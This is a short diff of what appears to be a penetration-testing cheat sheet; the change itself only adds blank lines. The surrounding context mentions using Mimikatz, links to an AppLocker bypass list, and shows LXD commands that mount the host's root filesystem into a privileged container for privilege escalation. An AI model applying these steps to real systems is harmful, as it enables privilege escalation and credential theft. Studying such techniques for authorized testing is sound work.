@@ -222,6 +222,7 @@ $Wscript.CreateShortcut($shortcut)
 8. Use Mimikatz
 
 Tips
+
 8.1 If it is getting block by group policy, search for Applocker Bypass list.
 https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-
 AppLockerbypasses.md
@@ -357,8 +358,10 @@ lxc init ubuntu:16.04 blah -c security.privileged=true
 lxc config device add blah root disk source=/ path=/mnt/root recursive=true
 ```
 Steps
+
 13.1 Create a alpine build locally.
 Link: https://github.com/saghul/lxd-alpine-builder
+
 13.2 Transfer tar.gz file on remote machine.
 ```
 scp yourfile.tar.gz user@x.x.x.x:
